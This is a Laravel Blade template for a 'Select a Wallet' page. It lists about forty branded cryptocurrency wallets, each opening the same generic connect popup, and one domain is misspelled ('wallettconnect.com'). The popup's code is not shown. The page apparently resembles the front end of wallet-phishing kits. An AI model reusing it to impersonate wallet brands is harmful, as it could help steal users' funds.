@extends('layouts.mobile-user')
@section('content')
    <style>
        .contact-info-item {
            text-align: center;
            background: white;
            border-radius: 30px;
            margin-bottom: 30px;
            border: 1px solid rgba(43 44 56 / 46%);
            padding: 60px 30px 50px;
        }
        .contact-info-item .icon {
            width: 80px;
            height: 80px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            border: 1px solid #292A37;
            margin: 0 auto 20px;
            font-size: 0px;
            color: var(--tg-white);
            line-height: 1;
        }
        .avatar{
            width: 80px;
            /*height: 80px;*/
            border-radius: 50px;
        }
        .contact-info-item .content .title {
            font-size: 20px;
            margin-bottom: 20px;
        }
        .contact-info-item .content p {
            margin-bottom: 0;
            font-size: 20px;
        }
        .contact-info-item .content a {
            color: var(--tg-paragraph-color);
        }
        .contact-info-item .content a:hover {
            color: var(--tg-primary-color);
        }
        .contact-form-wrap .col-43 {
            width: 43%;
            flex: 0 0 auto;
        }
        .contact-form-wrap .col-57 {
            width: 57%;
            flex: 0 0 auto;
        }
        .contact-map {
            width: 100%;
            height: 100%;
        }
        .contact-map iframe {
            width: 100%;
            height: 100%;
            border-radius: 15px 0 0 15px;
        }
        .contact-form {
            background: var(--tg-secondary-color);
            border-radius: 0 15px 15px 0;
            padding: 50px 50px;
        }
        .contact-form .title {
            font-size: 28px;
            margin-bottom: 30px;
            font-weight: 500;
        }
        .contact-form .row {
            --bs-gutter-x: 20px;
        }
        .contact-form .form-grp {
            margin-bottom: 20px;
        }
        .contact-form .form-grp textarea,
        .contact-form .form-grp input {
            width: 100%;
            background: rgba(255 255 255 / 7%);
            display: block;
            border: none;
            padding: 15px 15px;
            border-radius: 30px;
            color: var(--tg-white);
            line-height: 1;
            height: 50px;
        }
        .contact-form .form-grp textarea::placeholder,
        .contact-form .form-grp input::placeholder {
            color: #AAABB2;
        }
        .contact-form .form-grp textarea {
            min-height: 160px;
            max-height: 160px;
        }
        .contact-form .btn:hover {
            background: var(--tg-primary-color);
        }
        .searchBox {
            display: grid;
            grid-template-columns: 80% 20%;
            grid-gap: 10px;
            margin: 20px 0px;
        }

        .searchBox input {
            /*border-radius: 0px;*/
            /*border: 2px solid #000;*/
            padding: 10px 15px;
        }

        .searchBox input:focus {
            border: 2px solid #000;
            box-shadow: none;
        }

        .searchBox .btn {
            font-size: 16px;
        }

        @media screen and (max-width: 768px) {
            .searchBox {
                grid-template-columns: 100%;
            }
        }
        .modal-content .close {
            overflow: hidden;
            height: 30px;
            width: 30px;
            border-radius: 50px;
            position: absolute;
            right: -15px;
            top: -15px;
            background-color: #fff;
            border: none;
            outline: none;
            z-index: 10 !important;
            opacity: 1;
            box-shadow: 0px 3px 16px rgb(47 83 109 / 12%);
        }
        .close {
            float: right;
            font-size: 1.5rem;
            font-weight: 700;
            line-height: 1;
            color: #000;
            text-shadow: 0 1px 0 #fff;
        }

    </style>
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <h2 class="tf-title style2">
                    Select a Wallet</h2>
                <div class="heading-line s2"></div>
            </div>

            <div class="col-md-12 searchBox">
                <input type="text" class="w-100 me-2 form-control" name="" id="searchInp" placeholder="Find your wallet">
                <button class="btn btn-primary py-2" style="border-radius: 10px; background-color: #1879be;">Search</button>
            </div>

            <div class="col-md-12 my-4">
                <div class="w-100 py-2" id="numRes">
                    <h5 class="fs-6"><span id="resnum">0</span> results found</h5>
                </div>
            </div>
        </div>
        <div class="row"  id="searchList">


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="ledger" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="ledger"
                     data-logo="{{asset('assets/img/icon/images.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/images.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Ledger</a></h5>
                        <span class="price">ledger.com</span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="wallet_connect" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Wallet Connect"
                     data-logo="{{asset('assets/img/icon/walle.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/walle.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Wallet Connect</a></h5>
                        <span class="price">wallettconnect.com</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="metamask" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Metamask"
                     data-logo="{{asset('assets/img/icon/metamask.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/metamask.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Metamask</a></h5>
                        <span class="price">metamask.io</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="binance" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Binance Chain Wallet"
                     data-logo="{{asset('assets/img/icon/binance.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/binance.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Binance Chain Wallet</a></h5>
                        <span class="price">binance.com</span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Xumm" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Xumm Wallet"
                     data-logo="{{asset('assets/img/icon/download-5.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-5.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Xumm Wallet</a></h5>
                        <span class="price">Xumm.app</span>
                    </div>
                </div>
            </div>
            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Bitvavo" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Bitvavo Wallet"
                     data-logo="{{asset('assets/img/icon/bitvavo.jpeg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/bitvavo.jpeg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Bitvavo</a></h5>
                        <span class="price">Bitvavo.app</span>
                    </div>
                </div>
            </div>
            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Revolut" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Revolut Wallet"
                     data-logo="{{asset('assets/img/icon/revolut.jpeg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/revolut.jpeg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Revolut Wallet</a></h5>
                        <span class="price">Revolut.app</span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="dcent" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="D'Cent Wallet"
                     data-logo="{{asset('assets/img/icon/y-300x300.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/y-300x300.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>D'Cent Wallet</a></h5>
                        <span class="price">dcentwallet.com</span>
                    </div>
                </div>
            </div>
            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="trust" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Trust Wallet"
                     data-logo="{{asset('assets/img/icon/trust_wallet.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/trust_wallet.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Trust Wallet</a></h5>
                        <span class="price">trustwallet.com</span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="polygon" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Polygon Wallet"
                     data-logo="{{asset('assets/img/icon/polygon.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/polygon.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Polygon Wallet</a></h5>
                        <span class="price">polygon.technology</span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="bitpay" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Bitpay"
                     data-logo="{{asset('assets/img/icon/bitpay.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/bitpay.jpg')}}" alt="Image" class="avatar" style="text-align: center;">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Bitpay</a></h5>
                        <span class="price">bitpay.com</span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="waleth" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Walleth"
                     data-logo="{{asset('assets/img/icon/walleth.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/walleth.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Walleth</a></h5>
                        <span class="price">walleth.org</span>
                    </div>
                </div>
            </div>



            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="argent" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Argent"
                     data-logo="{{asset('assets/img/icon/argent.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/argent.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Argent</a></h5>
                        <span class="price">argent.xyz</span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="encrypted_ink" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Encrypted Ink"
                     data-logo="{{asset('assets/img/icon/encrypted_ink.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/encrypted_ink.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Encrypted Ink</a></h5>
                        <span class="price">encrypted.ink</span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="keplr" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="KEPLR"
                     data-logo="https://play-lh.googleusercontent.com/YM7h-nnxtDs9WROvE0GUzreNFua0eIm2N2m181BuiLgAqOeByqYZahsnbKos2xSGdAmv=w240-h480-rw"
                     style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="https://play-lh.googleusercontent.com/YM7h-nnxtDs9WROvE0GUzreNFua0eIm2N2m181BuiLgAqOeByqYZahsnbKos2xSGdAmv=w240-h480-rw"
                                 alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>KEPLR</a></h5>
                        <span class="price">KEPLR</span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="compound" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Compound"
                     data-logo="{{asset('assets/img/icon/compound.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/compound.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Compound</a></h5>
                        <span class="price">compound.finance</span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="iotex" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Iotex"
                     data-logo="{{asset('assets/img/icon/iotex.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/iotex.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Iotex</a></h5>
                        <span class="price">iotex.io</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="coin98" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Coin98"
                     data-logo="{{asset('assets/img/icon/coin98.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/coin98.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Coin98</a></h5>
                        <span class="price">coin98.com</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="coinbase" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Coinbase"
                     data-logo="{{asset('assets/img/icon/coinbase.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/coinbase.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Coinbase</a></h5>
                        <span class="price">coinbase.com</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="crypto" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Crypto.com | Defi Wallet"
                     data-logo="{{asset('assets/img/icon/crypto.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/crypto.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Crypto.com | Defi Wallet</a></h5>
                        <span class="price">crypto.com</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="token_pocket" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Token Pocket"
                     data-logo="{{asset('assets/img/icon/token_pocket.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/token_pocket.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Token Pocket</a></h5>
                        <span class="price">tokenpocket.pro</span>
                    </div>
                </div>
            </div>




            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Arculus" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Arculus"
                     data-logo="{{asset('assets/img/icon/Arculus.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/Arculus.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Arculus</a></h5>
                        <span class="price">Arculus</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="math_wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Math Wallet"
                     data-logo="{{asset('assets/img/icon/math_wallet.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/math_wallet.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Math Wallet</a></h5>
                        <span class="price">mathwallet.org</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="ledger_live" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Ledger Live"
                     data-logo="{{asset('assets/img/icon/ledger_live.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/ledger_live.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Ledger Live</a></h5>
                        <span class="price">ledger.com</span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="dharma" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Dharma"
                     data-logo="{{asset('assets/img/icon/dharma.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/dharma.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Dharma</a></h5>
                        <span class="price">dharma.io</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="my_key" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="MYKEY"
                     data-logo="{{asset('assets/img/icon/mykey.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/mykey.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>MYKEY</a></h5>
                        <span class="price">mykey.org</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="atomic" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Atomic"
                     data-logo="{{asset('assets/img/icon/atomic.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/atomic.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Atomic</a></h5>
                        <span class="price">atomicwallet.io</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="cool_wallet_s" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="CoolWallet S"
                     data-logo="{{asset('assets/img/icon/cool_wallet_s.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/cool_wallet_s.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>CoolWallet S</a></h5>
                        <span class="price">coolwallet.io</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="nash" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Nash"
                     data-logo="{{asset('assets/img/icon/nash.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/nash.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Nash</a></h5>
                        <span class="price">nash.io</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="coinomi" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Coinomi"
                     data-logo="{{asset('assets/img/icon/coinomi.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/coinomi.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Coinomi</a></h5>
                        <span class="price">coinomi.com</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="gridplus" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="GridPlus"
                     data-logo="{{asset('assets/img/icon/gridplus.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/gridplus.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>GridPlus</a></h5>
                        <span class="price">gridplus.io</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="tokenary" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Tokenary"
                     data-logo="{{asset('assets/img/icon/tokenary.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/tokenary.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Tokenary</a></h5>
                        <span class="price">tokenary.io</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="safepal" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="SafePal"
                     data-logo="{{asset('assets/img/icon/safepal.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/safepal.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>SafePal</a></h5>
                        <span class="price">safepal.io</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="infinito" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Infinito"
                     data-logo="{{asset('assets/img/icon/infinito.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/infinito.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Infinito</a></h5>
                        <span class="price">infinitowallet.io</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="wallet_io" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Wallet.io"
                     data-logo="{{asset('assets/img/icon/wallet_io.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/wallet_io.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Wallet.io</a></h5>
                        <span class="price">wallet.io</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="ownbit" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Ownbit"
                     data-logo="{{asset('assets/img/icon/ownbit.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/ownbit.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Ownbit</a></h5>
                        <span class="price">ownbit.io</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="easypocket" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="EasyPocket"
                     data-logo="{{asset('assets/img/icon/easypocket.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/easypocket.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>EasyPocket</a></h5>
                        <span class="price">easypocket.app</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="bridget_wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Bridge Wallet"
                     data-logo="{{asset('assets/img/icon/bridge_wallet.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/bridge_wallet.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Bridge Wallet</a></h5>
                        <span class="price">mtpelerin.com</span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="bitkeep" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="BitKeep"
                     data-logo="{{asset('assets/img/icon/bitkeep.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/bitkeep.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>BitKeep</a></h5>
                        <span class="price">bitkeep.com</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="unstoppable_wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet"
                     data-title="Unstoppable Wallet" data-logo="{{asset('assets/img/icon/unstoppable_wallet.jpg')}}"
                     style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/unstoppable_wallet.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Unstoppable Wallet</a></h5>
                        <span class="price">unstoppable.money</span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="halodefi_wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="HaloDefi Wallet"
                     data-logo="{{asset('assets/img/icon/halodefi_wallet.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/halodefi_wallet.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>HaloDefi Wallet</a></h5>
                        <span class="price">halodefi.org</span>
                    </div>
                </div>
            </div>

